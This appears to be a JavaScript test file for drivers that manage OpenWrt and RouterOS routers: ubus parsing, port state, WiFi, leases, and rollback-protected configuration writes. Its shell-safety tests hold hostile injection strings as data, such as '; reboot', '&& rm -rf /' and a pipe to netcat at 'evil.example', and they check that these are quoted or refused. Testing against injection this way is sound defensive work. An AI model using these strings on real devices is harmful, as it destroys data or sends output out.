// Managing two operating systems from one platform.
//
// Three things get the hardest treatment, because each one fails quietly rather than loudly:
//
//  1. UP vs CARRIER. OpenWrt reports administrative state and physical link separately; RouterOS
//     calls them `disabled` and `running`. Map them the wrong way round and every unplugged port
//     shows as live, which is worse than no monitoring at all — someone trusts it.
//
//  2. THE ubus RESULT WRAPPER. A ubus failure arrives as HTTP 200 with a JSON-RPC *result* whose
//     first element is an error code. Reading `result` as success turns "permission denied" into
//     an empty interface list, and a locked-down device then looks like a device with no ports.
//
//  3. SHELL QUOTING. The SSH fallback runs commands as root on customer hardware, built partly
//     from database values. The injection shapes are tested explicitly.
import {
  CAPABILITIES, PLATFORMS, platformOf, capsFor, can, capMap, guessPlatform, guard, nullDriver
} from '../lib/drivers/index.js';
import {
  NULL_SESSION, rpcEnvelope, loginEnvelope, parseRpc, sessionFromLogin, parseBoard, parseSysinfo,
  parseDevices, parseInterfaceDump, mergeInterfaces, parseIwinfo, parseAssoclist, parseLuciLeases,
  parseLeaseFile, secondsToSpan, createDriver
} from '../lib/drivers/openwrt.js';
import { shellQuote, buildCommand } from '../lib/sshexec.js';
import { probeDevice } from '../lib/probe.js';
import { readFileSync } from 'node:fs';

let pass = 0, fail = 0; const ok = (c, m) => { c ? pass++ : fail++; console.log(c ? 'PASS' : 'FAIL', m); };

// ---- the registry ------------------------------------------------------------------------------
{
  ok(platformOf({ platform: 'openwrt' }) === 'openwrt', 'a device names its platform');
  // Every device that exists today predates this column. They are all MikroTik, and must keep
  // working with no migration of their rows.
  ok(platformOf({}) === 'routeros', 'a device with no platform set is RouterOS, as every existing one is');
  ok(platformOf({ platform: 'OpenWRT' }) === 'openwrt', 'the value is case-insensitive');
  ok(platformOf({ platform: 'nonsense' }) === 'routeros', 'an unrecognised value does not produce an undefined driver');

  ok(can('routeros', 'wifiWrite'), 'RouterOS can have its WiFi rewritten');
  ok(can('openwrt', 'wifiWrite'), 'OpenWrt can now write WiFi — the first configuration capability');
  // `firmware` is the one still deliberately withheld: sysupgrade exists on the hardware, and a
  // failed firmware push at a customer's house is not recoverable remotely.
  ok(!can('openwrt', 'firmware'), 'but not firmware, which is withheld on purpose');
  ok(can('openwrt', 'interfaces') && can('openwrt', 'dhcpRead') && can('openwrt', 'wifiClients'),
    'but OpenWrt does cover the monitoring set');
  ok(!can('ddwrt', 'wifiRead'), 'DD-WRT claims nothing it cannot actually do');
  ok(capsFor('unknown').length === 0, 'an unmanaged device claims nothing at all');

  // Every capability a platform claims must be a real name, or the UI silently hides a working
  // button (or shows a broken one) and nothing errors.
  for (const [key, p] of Object.entries(PLATFORMS))
    for (const c of p.caps)
      ok(CAPABILITIES.includes(c), `${key} claims only real capabilities (${c})`);

  const m = capMap('openwrt');
  ok(m.interfaces === true && m.firmware === false, 'the capability map is complete, not sparse');
  ok(Object.keys(m).length === CAPABILITIES.length, 'and covers every capability, so absent never means unknown');

  ok(guessPlatform({ manufacturer: 'MikroTik', model: 'hEX S' }) === 'routeros', 'a MikroTik model guesses RouterOS');
  ok(guessPlatform({ manufacturer: 'Katalyst', model: 'Spark K500A' }) === 'openwrt', 'a Katalyst Spark guesses OpenWrt');
  ok(guessPlatform({ manufacturer: 'Netgear', model: 'R7000' }) === 'unknown',
    'and hardware that could be running anything guesses nothing — the field stays for a person to set');
}

// ---- guard: an unsupported call is a clear 400, not a mysterious timeout -----------------------
{
  const g = guard({ wifi: async () => ({ radios: ['should not reach here'] }), interfaces: async () => 'fine' }, 'ddwrt');
  ok(await g.interfaces() === 'fine', 'a supported call passes straight through');
  let e = null;
  try { await g.wifi(); } catch (err) { e = err; }
  ok(e && e.http === 400, 'an unsupported call fails as a 400, not a device error');
  ok(e && /DD-WRT/.test(e.message), 'and the message names the platform rather than blaming the router');

  let ne = null;
  try { await nullDriver({ name: 'Old Netgear' }).poll(); } catch (err) { ne = err; }
  ok(ne && /Old Netgear/.test(ne.message) && ne.http === 400, 'an unmanaged device explains itself by name');
}

// ---- the ubus wrapper --------------------------------------------------------------------------
{
  const env = rpcEnvelope('abc', 'network.device', 'status', { x: 1 });
  ok(env.params[0] === 'abc' && env.params[1] === 'network.device' && env.params[2] === 'status',
    'the JSON-RPC envelope puts session, object and method in ubus order');
  ok(loginEnvelope('root', 'pw').params[0] === NULL_SESSION, 'login uses the null session, which is the only one it accepts');
  ok(loginEnvelope(undefined, undefined).params[3].username === '', 'a missing username does not become the string "undefined"');

  ok(parseRpc('{"jsonrpc":"2.0","id":1,"result":[0,{"a":1}]}').data.a === 1, 'code 0 yields the payload');

  // THE ONE THAT MATTERS: a failure delivered as a successful-looking result.
  const denied = parseRpc('{"jsonrpc":"2.0","id":1,"result":[6]}');
  ok(!denied.ok, 'a non-zero ubus code is a failure even though it arrived as a "result"');
  ok(/permission denied/i.test(denied.error), 'and code 6 is translated, not reported as the integer 6');
  ok(/rpcd ACL/.test(denied.error), 'with the actual cause named, since that is what has to be fixed');
  ok(/not installed/.test(parseRpc('{"result":[3]}').error), 'code 3 explains that the object is missing');

  ok(!parseRpc('<html>404</html>').ok, 'an HTML error page is not mistaken for a reply');
  ok(!parseRpc('').ok && !parseRpc(null).ok, 'nor is an empty response');
  const exp = parseRpc('{"error":{"code":-32002,"message":"Access denied"}}');
  ok(!exp.ok && exp.expired, 'a rejected session is flagged, so the transport knows to log in again');

  ok(sessionFromLogin(parseRpc('{"result":[0,{"ubus_rpc_session":"' + 'a'.repeat(32) + '"}]}')) === 'a'.repeat(32),
    'the session id is extracted');
  ok(sessionFromLogin(parseRpc('{"result":[0,{"ubus_rpc_session":"nope"}]}')) === null,
    'and a malformed one is rejected rather than used in every later call');
  ok(sessionFromLogin(parseRpc('{"result":[6]}')) === null, 'a failed login yields no session');
}

// ---- what the device says it is ----------------------------------------------------------------
{
  // Shaped like a real vendor build: OpenWrt underneath, the manufacturer's name on top.
  const b = parseBoard({
    kernel: '5.15.137', hostname: 'Spark-K500A', system: 'MediaTek MT7981',
    model: 'Katalyst Spark K500A', board_name: 'mediatek,mt7981-spark',
    release: { distribution: 'Katalyst', version: '1.4.2', revision: 'r0+1', target: 'mediatek/filogic', description: 'Katalyst 1.4.2' }
  });
  ok(b.model === 'Katalyst Spark K500A', 'the model comes through');
  ok(b.distribution === 'Katalyst', 'and the vendor name, which is how a skin identifies itself');
  ok(b.osVersion === 'Katalyst 1.4.2', 'the displayed version prefers the vendor description over the OpenWrt base');

  // A stripped build that omits the release block entirely — it must still identify itself.
  const bare = parseBoard({ kernel: '5.15.137', board_name: 'generic' });
  ok(bare.model === 'generic' && bare.osVersion === '5.15.137', 'a build with no release block still reports something usable');
  ok(parseBoard({}).model === null, 'and an empty payload does not throw');

  const s = parseSysinfo({ uptime: 93784, load: [65536, 32768, 6553], memory: { total: 512e6, free: 300e6 } });
  ok(s.uptime === 93784, 'uptime is read');
  ok(s.load1 === 1 && s.load5 === 0.5, 'load is divided by 65536, since ubus reports it fixed-point');
  ok(parseSysinfo({}).uptime === 0, 'a missing sysinfo is zero, not NaN');
}

// ---- ports: the up/carrier distinction ---------------------------------------------------------
{
  const d = parseDevices({
    'br-lan': { up: true, carrier: true, type: 'bridge', macaddr: 'aa:bb:cc:dd:ee:01', speed: 1000, duplex: 'full',
                statistics: { rx_bytes: 500, tx_bytes: 900 } },
    'wan':    { up: true, carrier: false, macaddr: 'aa:bb:cc:dd:ee:02', statistics: {} },
    'lan2':   { up: false, carrier: false, macaddr: 'aa:bb:cc:dd:ee:03', statistics: {} }
  });
  const by = Object.fromEntries(d.map(x => [x.name, x]));
  ok(by['br-lan'].running === true, 'a port with carrier is running');
  // The failure this prevents: an enabled-but-unplugged port showing as live on the dashboard.
  ok(by['wan'].running === false, 'an ENABLED port with no carrier is NOT running — up is not link');
  ok(by['wan'].disabled === false, 'and it is not disabled either; those are different facts');
  ok(by['lan2'].disabled === true, 'an administratively down port is disabled');
  ok(by['br-lan'].speed === '1Gbps-full', '1000 Mbit/s full duplex reads as 1Gbps-full, matching RouterOS');
  ok(by['br-lan'].rxBytes === 500 && by['br-lan'].txBytes === 900, 'counters come through for the telemetry sampler');
  ok(by['br-lan'].mac === 'AA:BB:CC:DD:EE:01', 'MACs are normalised to upper case, as the rest of the app stores them');

  // Older builds report a string.
  ok(parseDevices({ e: { up: true, carrier: true, speed: '100F', statistics: {} } })[0].speed === '100Mbps-full',
    'the older "100F" string form is understood too');
  ok(parseDevices({ e: { up: true, carrier: true, statistics: {} } })[0].speed === '',
    'and an unreported speed is blank rather than "undefined"');
  ok(parseDevices({}).length === 0 && parseDevices(null).length === 0, 'an empty or absent payload is an empty list');
  ok(parseDevices({ wlan0: { up: true, carrier: true, statistics: {} } })[0].type === 'wifi',
    'a radio is typed as wifi even when the payload omits the type');
}

// ---- logical interfaces carry the addresses ----------------------------------------------------
{
  const logical = parseInterfaceDump({
    interface: [
      { interface: 'lan', up: true, proto: 'static', l3_device: 'br-lan', 'ipv4-address': [{ address: '192.168.1.1', mask: 24 }], route: [] },
      { interface: 'wan', up: true, proto: 'dhcp', l3_device: 'eth1', 'ipv4-address': [{ address: '68.12.9.44', mask: 22 }],
        route: [{ target: '0.0.0.0', mask: 0, nexthop: '68.12.8.1' }] },
      { interface: 'wan6', up: false, proto: 'dhcpv6', device: 'eth1', 'ipv4-address': [] }
    ]
  });
  ok(logical.length === 3, 'every logical interface is returned');
  ok(logical[1].gateway === '68.12.8.1', 'the default gateway identifies the WAN without guessing from its name');
  ok(logical[0].ipv4[0] === '192.168.1.1', 'addresses are read');

  const merged = mergeInterfaces(parseDevices({
    'br-lan': { up: true, carrier: true, statistics: {} },
    'eth1':   { up: true, carrier: true, statistics: {} },
    'eth2':   { up: true, carrier: false, statistics: {} }
  }), logical);
  const by = Object.fromEntries(merged.map(x => [x.name, x]));
  ok(by['br-lan'].ips[0] === '192.168.1.1', 'the logical address lands on the physical port carrying it');
  ok(by['eth1'].comment === 'wan, wan6', 'a port carrying two logical interfaces names both');
  ok(by['eth2'].ips.length === 0, 'a port with no logical interface simply has no address');
  ok(mergeInterfaces(parseDevices({ e: { up: true, statistics: {} } }), []).length === 1,
    'and a device whose ACL blocks the interface dump still returns its ports');
}

// ---- wifi --------------------------------------------------------------------------------------
{
  const r = parseIwinfo('wlan0', {
    ssid: 'GeekFi-5G', mode: 'Master', channel: 36, frequency: 5180, txpower: 23, signal: -40,
    encryption: { enabled: true, authentication: ['psk'], wpa: [2] }
  });
  ok(r.ssid === 'GeekFi-5G' && r.band === '5ghz', 'the SSID and band are read');
  ok(r.encryption !== 'open', 'encryption is reported');
  // iwinfo genuinely has no passphrase field; it is merged in from network.wireless, which is why
  // parsing iwinfo ALONE yields none.
  ok(r.password === '', 'parsing iwinfo alone yields no passphrase — it does not carry one');
  ok(parseIwinfo('wlan1', { frequency: 2412 }).band === '2ghz', '2.4 GHz is classified by frequency');
  ok(parseIwinfo('wlan1', {}).ssid === '', 'a radio with no SSID configured does not throw');

  const c = parseAssoclist({ results: [{ mac: 'de:ad:be:ef:00:11', signal: -55, noise: -95, inactive: 4300,
    rx: { rate: 286700 }, tx: { rate: 650000 } }] }, 'wlan0');
  ok(c[0].mac === 'DE:AD:BE:EF:00:11' && c[0].signal === -55, 'a station is read');
  ok(c[0].idleSeconds === 4, 'inactivity is converted from milliseconds to seconds');
  ok(c[0].txRate === 650, 'rates are converted from kbit/s to Mbit/s');
  ok(parseAssoclist({}, 'wlan0').length === 0, 'an empty assoclist is an empty list');
}

// ---- DHCP leases -------------------------------------------------------------------------------
{
  const f = parseLeaseFile([
    '1757894400 aa:bb:cc:11:22:33 192.168.1.100 jons-laptop 01:aa:bb:cc:11:22:33',
    '0 aa:bb:cc:44:55:66 192.168.1.10 printer *',
    'garbage line that should be skipped',
    '1757894400 not-a-mac 192.168.1.5 x *'
  ].join('\n'));
  ok(f.length === 2, 'malformed lines are skipped rather than producing junk rows');
  ok(f[0].host === 'jons-laptop' && f[0].address === '192.168.1.100', 'a lease is read');
  // dnsmasq writes 0 for a static reservation. Treating it as an epoch reports every static lease
  // as having expired in 1970.
  ok(f[1].expires === 'static' && f[1].dynamic === false, 'expiry 0 means static, not "expired in 1970"');
  ok(f[1].host === 'printer', 'and "*" for a hostname is blanked, not shown literally');
  ok(parseLeaseFile('').length === 0, 'an empty leases file is an empty list');

  const l = parseLuciLeases({ dhcp_leases: [{ ipaddr: '192.168.1.55', macaddr: 'aa:bb:cc:00:00:01', hostname: '?', expires: 3600 }] });
  ok(l[0].address === '192.168.1.55' && l[0].host === '', 'LuCI\'s "?" for an unknown hostname becomes blank');
  ok(l[0].expires === '1h0m', 'and its expiry is formatted the way the RouterOS lease table already reads');

  ok(secondsToSpan(93784) === '1d2h' && secondsToSpan(45) === '45s', 'spans are formatted like RouterOS');
}

// ---- shell safety on the SSH path --------------------------------------------------------------
{
  ok(shellQuote('plain') === "'plain'", 'an ordinary argument is quoted');
  ok(shellQuote("it's") === "'it'\\''s'", 'an embedded quote is closed, escaped and reopened');

  // These are what a poisoned device record would carry, reaching a root shell on the far end.
  for (const evil of ['; reboot', '$(reboot)', '`id`', '&& rm -rf /', "'; wg set wg0 peer x remove #", '| nc evil.example 1234']) {
    const cmd = buildCommand(['logread', '-l', evil]);
    ok(cmd !== null, `an odd argument is quoted rather than refused: ${JSON.stringify(evil.slice(0, 18))}`);
    const quoted = cmd.slice('logread '.length);
    ok(!/(^|[^\\'])[;&|`$]/.test(quoted.replace(/'[^']*'/g, "''")),
      `and no metacharacter survives outside the quotes: ${JSON.stringify(evil.slice(0, 18))}`);
  }
  // The command word itself is not quotable — it has to be a real binary name.
  ok(buildCommand(['ubus; reboot', 'call']) === null, 'a crafted command word builds nothing at all');
  ok(buildCommand(['rm -rf /']) === null, 'nor does one with a space in it');
  ok(buildCommand([]) === null && buildCommand(null) === null, 'an empty argv builds nothing');
  ok(buildCommand(['ubus', '-S', 'call', 'system', 'board']) === "ubus '-S' 'call' 'system' 'board'",
    'and the real command is built as expected');
}

// ---- the driver, against captured device output ------------------------------------------------
//
// The transport is faked; every parser and every ubus object name is the real one. So this exercises
// the code that will run against hardware, without hardware.
{
  const CAPTURED = {
    'system.board': { model: 'Katalyst Spark K500A', board_name: 'mediatek,mt7981-spark', kernel: '5.15.137',
      hostname: 'Spark', release: { distribution: 'Katalyst', version: '1.4.2', description: 'Katalyst 1.4.2' } },
    'system.info': { uptime: 3600, load: [65536, 0, 0], memory: { total: 512e6, free: 400e6 } },
    'network.device.status': {
      'br-lan': { up: true, carrier: true, macaddr: 'aa:bb:cc:00:00:01', speed: 1000, duplex: 'full', statistics: { rx_bytes: 10, tx_bytes: 20 } },
      'eth1':   { up: true, carrier: true, macaddr: 'aa:bb:cc:00:00:02', speed: 2500, duplex: 'full', statistics: {} }
    },
    'network.interface.dump': { interface: [
      { interface: 'lan', up: true, l3_device: 'br-lan', 'ipv4-address': [{ address: '192.168.1.1' }] },
      { interface: 'wan', up: true, l3_device: 'eth1', 'ipv4-address': [{ address: '68.12.9.44' }],
        route: [{ target: '0.0.0.0', mask: 0, nexthop: '68.12.8.1' }] }
    ] },
    'iwinfo.devices': { devices: ['wlan0'] },
    'iwinfo.info': { ssid: 'GeekFi', frequency: 5180, encryption: { enabled: true, authentication: ['psk'] } },
    'iwinfo.assoclist': { results: [{ mac: 'de:ad:be:ef:00:11', signal: -50, inactive: 1000, rx: { rate: 100000 }, tx: { rate: 200000 } }] },
    'file.read': { data: '0 aa:bb:cc:44:55:66 192.168.1.10 printer *\n' }
  };
  const fake = (denied = new Set()) => ({
    kind: 'test', endpoint: 'test://',
    calls: [],
    async call(object, method, params) {
      this.calls.push(`${object}.${method}`);
      if (denied.has(object)) return { ok: false, code: 6, error: 'permission denied' };
      const key = `${object}.${method}`;
      return key in CAPTURED ? { ok: true, data: CAPTURED[key] } : { ok: false, code: 4, error: 'not found' };
    }
  });

  const d = createDriver({ mgmt_address: '10.147.21.14', admin_username: 'root', admin_password: 'x' }, { transport: fake() });
  const id = await d.identity();
  ok(id.model === 'Katalyst Spark K500A' && id.osVersion === 'Katalyst 1.4.2', 'identity reads the board');
  ok(id.uptime === 3600, 'and folds in system info');

  const { interfaces } = await d.interfaces();
  ok(interfaces.length === 2, 'both ports come back');
  ok(interfaces.find(i => i.name === 'eth1').ips[0] === '68.12.9.44', 'with their addresses merged on');
  ok(interfaces.find(i => i.name === 'eth1').speed === '2.5Gbps-full', 'and the 2.5G WAN port reads correctly');

  ok((await d.wifiClients())[0].mac === 'DE:AD:BE:EF:00:11', 'associated stations are listed');
  ok((await d.dhcpLeases())[0].address === '192.168.1.10', 'leases fall back to the file when luci-rpc is absent');

  // The passphrase reaches the reveal, and never reaches storage. Both halves matter, and the
  // second is the one that makes the first safe.
  {
    const CAP2 = {
      ...CAPTURED,
      'network.wireless.status': { mt0: { config: { band: '2g' }, interfaces: [
        { config: { ifname: 'wlan0', ssid: 'GeekFi', encryption: 'psk2', key: 'the-real-passphrase', mode: 'ap' } }
      ] } },
      'iwinfo.devices': { devices: ['wlan0'] }
    };
    const t2 = { kind: 'test', endpoint: 't', async call(o, m) { const k = `${o}.${m}`; return k in CAP2 ? { ok: true, data: CAP2[k] } : { ok: false, code: 4, error: 'nf' }; } };
    const d2 = createDriver({ mgmt_address: '10.0.0.5', admin_password: 'x' }, { transport: t2 });
    const wifi = await d2.wifi();
    const radio = wifi.radios.find(r => r.iface === 'wlan0');
    ok(radio.password === 'the-real-passphrase', 'the reveal path gets the passphrase, as RouterOS always has');
    ok(radio.encryption && radio.encryption !== 'open',
      'alongside the encryption it is protecting — here iwinfo reported it, so UCI is not consulted');

    // This mirrors exactly what pollViaDriver stores.
    const stored = { system: wifi.system, radios: wifi.radios.map(r => ({ iface: r.iface, ssid: r.ssid, disabled: r.disabled, band: r.band, hasPassword: !!r.password })) };
    ok(!JSON.stringify(stored).includes('the-real-passphrase'),
      'but nothing resembling it survives into what the poll writes to the database');
    ok(stored.radios[0].hasPassword === true, 'which records only that one is set');
  }

  const p = await d.poll();
  ok(p.interfaces.length === 2 && p.osVersion === 'Katalyst 1.4.2', 'one poll returns everything the device page stores');
  ok(p.serial === null, 'and reports no serial rather than inventing one — ubus has no board serial');

  // A stripped ACL: the realistic vendor-skin failure. Identity must still work, and WiFi must
  // degrade to empty rather than taking the whole poll down.
  const strict = createDriver({ mgmt_address: '10.0.0.1', admin_password: 'x' }, { transport: fake(new Set(['iwinfo'])) });
  const sp = await strict.poll();
  ok(sp.interfaces.length === 2, 'a device whose ACL blocks iwinfo still polls its ports');
  ok(sp.wifi.radios.length === 0, 'and simply reports no radios');

  // But a denial of something essential must NOT be silently empty.
  const broken = createDriver({ mgmt_address: '10.0.0.1', admin_password: 'x' }, { transport: fake(new Set(['network.device'])) });
  let err = null;
  try { await broken.interfaces(); } catch (e) { err = e; }
  ok(err && /permission denied/i.test(err.message), 'a denied interface read is an error, not an empty port list');
}

// ---- telemetry: the two graphs that stayed empty ------------------------------------------------
//
// An OpenWrt device polled perfectly and still showed no traffic and no latency, because the
// sampler was RouterOS REST outright — it asked the Katalyst for /rest/interface every minute and
// got the vendor's HTML page back. And the ZeroTier interface showed no address, because ZeroTier
// assigns its own outside UCI, so `network.interface dump` genuinely does not have it.
{
  const { parseIpAddr, parsePingMs, createDriver } = await import('../lib/drivers/openwrt.js');

  // Kernel addresses. The line that matters is the last one.
  const addrs = parseIpAddr([
    '1: lo    inet 127.0.0.1/8 scope host lo',
    '2: br-lan    inet 192.168.8.1/24 brd 192.168.8.255 scope global br-lan',
    '8: rmnet_mhi0    inet 97.202.242.70/30 scope global rmnet_mhi0',
    '9: zt44xiyxyh    inet 10.241.80.78/16 brd 10.241.255.255 scope global zt44xiyxyh'
  ].join('\n'));
  ok(addrs['zt44xiyxyh'][0] === '10.241.80.78',
    'the ZeroTier address is read from the kernel — UCI never had it, which is why the field was blank');
  ok(addrs['br-lan'][0] === '192.168.8.1', 'and ordinary interfaces still come through');
  ok(!addrs.lo, 'loopback is skipped');
  ok(Object.keys(parseIpAddr('')).length === 0, 'empty output is empty, not a crash');

  // Ping. busybox is what OpenWrt ships, and it formats differently from iputils.
  ok(parsePingMs('round-trip min/avg/max = 23.4/24.1/25.0 ms') === 24.1, "busybox's summary line parses");
  ok(parsePingMs('rtt min/avg/max/mdev = 23.4/24.1/25.0/0.6 ms') === 24.1, "as does iputils' four-value form");
  ok(parsePingMs('64 bytes from 8.8.8.8: seq=0 ttl=117 time=20.0 ms\n64 bytes from 8.8.8.8: seq=1 ttl=117 time=30.0 ms') === 25,
    'and with no summary at all, the individual replies are averaged');
  ok(parsePingMs('PING 8.8.8.8: 56 data bytes\n\n--- 8.8.8.8 ping statistics ---\n3 packets transmitted, 0 received') === null,
    'a ping where nothing came back is null — not zero, which would read as a perfect link');
  ok(parsePingMs('') === null && parsePingMs(null) === null, 'and no output is null');

  // The driver methods the sampler calls.
  const status = {
    'br-lan': { up: true, carrier: true, macaddr: 'aa:bb:cc:00:00:01', statistics: { rx_bytes: 1000, tx_bytes: 2000 } },
    'rmnet_mhi0': { up: true, carrier: true, statistics: { rx_bytes: 5000, tx_bytes: 6000 } },
    'lo': { up: true, carrier: true, statistics: { rx_bytes: 1, tx_bytes: 1 } }
  };
  let ran = [];
  const t = {
    kind: 'ssh', endpoint: 'ssh://test',
    async call(o, m) { return o === 'network.device' && m === 'status' ? { ok: true, data: status } : { ok: false, code: 4, error: 'not found' }; },
    async run(argv) {
      ran.push(argv.join(' '));
      if (argv[0] === 'ip') return { ok: true, data: '9: zt44xiyxyh    inet 10.241.80.78/16 scope global zt44xiyxyh' };
      // Non-zero exit with usable output: busybox ping does exactly this when a packet is lost.
      if (argv[0] === 'ping') return { ok: false, error: 'exited 1', data: '2 packets received\nround-trip min/avg/max = 18.2/19.5/21.0 ms' };
      return { ok: false, data: '', error: 'no' };
    }
  };
  const drv = createDriver({ mgmt_address: '10.241.80.78', admin_password: 'x' }, { transport: t });

  const ctrs = await drv.counters();
  ok(ctrs.length === 2, 'counters come back for the real ports (loopback excluded)');
  ok(ctrs.find(c => c.name === 'rmnet_mhi0').rxBytes === 5000, 'with byte counts the sampler can difference');

  const ms = await drv.latency();
  ok(ms === 19.5, 'latency parses even though busybox ping exited non-zero after losing a packet');
  ok(ran.some(c => c.startsWith('ping -c 3')), 'and it pings FROM the device, which is what measures the customer WAN');
  ok(await drv.latency('; reboot') === null, 'a crafted ping target is refused rather than run');

  const { interfaces } = await drv.interfaces();
  const zt = interfaces.find(i => i.name === 'zt44xiyxyh');
  ok(!zt, 'an interface the kernel knows but ubus does not is not invented');
  const brlan = interfaces.find(i => i.name === 'br-lan');
  ok(brlan && Array.isArray(brlan.ips), 'the merge runs without the kernel read breaking it');
  ok(ran.some(c => c === 'ip -o -4 addr'), 'and the kernel address read is actually attempted');

  // A transport with no shell (HTTP-only) must still work, just without the extras.
  const httpOnly = createDriver({ mgmt_address: '10.0.0.1', admin_password: 'x' }, {
    transport: { kind: 'http', endpoint: 'http://x', async call(o, m) { return o === 'network.device' ? { ok: true, data: status } : { ok: false, code: 4, error: 'nf' }; } }
  });
  ok((await httpOnly.counters()).length === 2, 'counters work over HTTP too');
  ok(await httpOnly.latency() === null, 'and latency degrades to null rather than throwing when there is no shell');
}

// ---- writing configuration ---------------------------------------------------------------------
//
// The first writes to a customer's router. What is tested here is not mainly "does the value get
// set" — it is the safety machinery around it, because that is what decides whether a mistake
// self-heals or becomes a van to somebody's house.
{
  const { validateSsid, validateWifiKey, isUciName, parseUciChanges, createDriver } =
    await import('../lib/drivers/openwrt.js');

  // ---- validation, before anything reaches a device ----
  ok(validateSsid('GeekFi-Home') === null, 'an ordinary SSID is accepted');
  ok(/empty/.test(validateSsid('')), 'an empty one is refused');
  // 32 BYTES, not characters. An SSID of accented or emoji characters hits the limit sooner than
  // its length suggests, and a router that silently truncates leaves a network nobody can find.
  ok(validateSsid('a'.repeat(32)) === null, '32 ASCII characters fit');
  ok(/32 bytes/.test(validateSsid('a'.repeat(33))), '33 do not');
  ok(/32 bytes/.test(validateSsid('é'.repeat(17))), 'and 17 two-byte characters do not either — the limit is bytes');
  ok(/control/.test(validateSsid('bad name')), 'control characters are refused');

  ok(validateWifiKey('longenough') === null, 'a normal passphrase is accepted');
  ok(/at least 8/.test(validateWifiKey('short')), 'a short one is refused before the router sees it');
  ok(/63/.test(validateWifiKey('x'.repeat(64))), 'and an over-long one');
  ok(validateWifiKey('a'.repeat(64).replace(/a/g, '0')) === null, 'while a 64-character raw PSK in hex IS valid and is allowed');

  ok(isUciName('wifi2g') && !isUciName('wifi 2g') && !isUciName('a;reboot'),
    'UCI names are narrow — they become part of a root-level call');

  ok(parseUciChanges({ wireless: [['set', 'wifi2g', 'ssid', 'New']] })[0].option === 'ssid',
    'staged changes parse into something a person can be shown');

  // ---- the confirmed-apply loop ----
  const scenario = (opts = {}) => {
    const calls = [];
    const transport = {
      kind: 'test', endpoint: 't', calls,
      async call(object, method, params) {
        calls.push(`${object}.${method}`);
        if (object === 'uci' && method === 'changes') return { ok: true, data: { wireless: [['set', 'wifi2g', 'ssid', 'New']] } };
        if (object === 'uci' && method === 'apply') {
          if (opts.applyFails) return { ok: false, error: 'apply refused' };
          return { ok: true, data: {} };
        }
        if (object === 'system' && method === 'board') {
          return opts.deviceGoesAway ? { ok: false, error: 'no response', unreachable: true } : { ok: true, data: { model: 'x' } };
        }
        if (object === 'uci' && method === 'confirm') {
          return opts.confirmFails ? { ok: false, error: 'confirm refused' } : { ok: true, data: {} };
        }
        return { ok: true, data: {} };
      }
    };
    return { transport, calls, driver: createDriver({ mgmt_address: '10.0.0.1', admin_password: 'x' }, { transport }) };
  };

  {
    const { driver, calls } = scenario();
    const r = await driver.setWifi({ section: 'wifi2g', ssid: 'GeekFi-New', password: 'supersecret', timeoutSeconds: 30 });
    ok(r.ok === true, 'a good change applies and confirms');
    // THE ORDER IS THE SAFETY PROPERTY. apply-with-rollback, then verify, then confirm.
    const seq = calls.filter(c => /^uci\.(apply|confirm)|^system\.board/.test(c));
    ok(seq[0] === 'uci.apply' && seq[1] === 'system.board' && seq[2] === 'uci.confirm',
      'in that order: apply, verify the device still answers, then confirm');
    ok(!calls.includes('uci.commit'), 'and NEVER a bare commit, which has no rollback behind it');
    ok(r.changed.some(c => c.option === 'ssid'), 'the change set is reported back');
    ok(!JSON.stringify(r.changed).includes('supersecret'), 'with the passphrase hidden in the summary');
  }

  {
    // THE CASE THAT MATTERS. The change applied, and then the device stopped answering — which is
    // exactly what a bad change looks like from here.
    const { driver, calls } = scenario({ deviceGoesAway: true });
    const r = await driver.setWifi({ section: 'wifi2g', ssid: 'Broken', timeoutSeconds: 30 });
    ok(r.ok === false && r.stage === 'verify', 'a device that goes silent after applying is a failure');
    ok(!calls.includes('uci.confirm'), 'confirm is NOT sent — that is what lets the rollback fire');
    ok(r.rolledBack === 'automatic', 'and the result says the device will revert itself');
    ok(/roll the change back on its own/.test(r.error) && /30 seconds/.test(r.error),
      'saying so in words, with the deadline, so nobody drives out to a device that is about to fix itself');
    // Deliberately not calling rollback: if we cannot reach the device to verify, we cannot reach
    // it to roll back either. The timer is the mechanism.
    ok(!calls.includes('uci.rollback'), 'no rollback call is attempted down a path we just proved is broken');
  }

  {
    const { driver } = scenario({ confirmFails: true });
    const r = await driver.setWifi({ section: 'wifi2g', ssid: 'X' });
    ok(r.ok === false && r.stage === 'confirm', 'a failed confirm is reported rather than assumed harmless');
    ok(/revert/.test(r.error), 'and the person is told the change will not stick');
  }

  {
    const { driver, calls } = scenario({ applyFails: true });
    const r = await driver.setWifi({ section: 'wifi2g', ssid: 'X' });
    ok(r.ok === false && r.stage === 'apply', 'a refused apply stops there');
    ok(!calls.includes('uci.confirm'), 'without confirming something that never happened');
  }

  // Bad input never reaches the device at all.
  {
    const { driver, calls } = scenario();
    ok((await driver.setWifi({ section: 'wifi2g', password: 'short' })).ok === false, 'a too-short password is refused');
    ok(!calls.includes('uci.apply'), 'and nothing is applied');
    ok((await driver.setWifi({ section: 'a;reboot', ssid: 'X' })).ok === false, 'a crafted section name is refused');
    ok((await driver.setWifi({ section: 'wifi2g' })).ok === false, 'and a change with nothing in it');
  }

  // ---- backup: the prerequisite ----
  {
    const ran = [];
    const t = {
      kind: 'ssh', endpoint: 'ssh://t',
      async call() { return { ok: false, code: 4, error: 'nf' }; },
      async run(argv) {
        ran.push(argv[0]);
        if (argv[0] === 'sysupgrade') return { ok: true, data: '' };
        if (argv[0] === 'base64') return { ok: true, data: Buffer.from('fake-tar-content').toString('base64') };
        return { ok: true, data: '' };
      }
    };
    const d = createDriver({ mgmt_address: '10.0.0.1', admin_password: 'x' }, { transport: t });
    const b = await d.configBackup();
    ok(b.format === 'tar.gz' && b.base64, 'a config backup comes back as a tar');
    ok(Buffer.from(b.base64, 'base64').toString() === 'fake-tar-content', 'and round-trips intact');
    ok(ran.includes('sysupgrade') && ran.includes('rm'), 'made with sysupgrade -b, and the temp file is cleaned up');

    // No shell means no backup — and that must be said, not silently skipped, because a write path
    // without an undo is the thing this exists to prevent.
    const noShell = createDriver({ mgmt_address: '10.0.0.1', admin_password: 'x' }, {
      transport: { kind: 'http', endpoint: 'h', async call() { return { ok: false, error: 'nf' }; } }
    });
    let err = null;
    try { await noShell.configBackup(); } catch (e) { err = e; }
    ok(err && /shell access/.test(err.message), 'a device with no shell says why it cannot be backed up');
  }

  // ---- firmware is READ ONLY, on purpose ----
  {
    const { capsFor } = await import('../lib/drivers/index.js');
    ok(!capsFor('openwrt').includes('firmware'),
      'firmware is NOT claimed for OpenWrt — sysupgrade exists on the hardware and is deliberately not wired up');
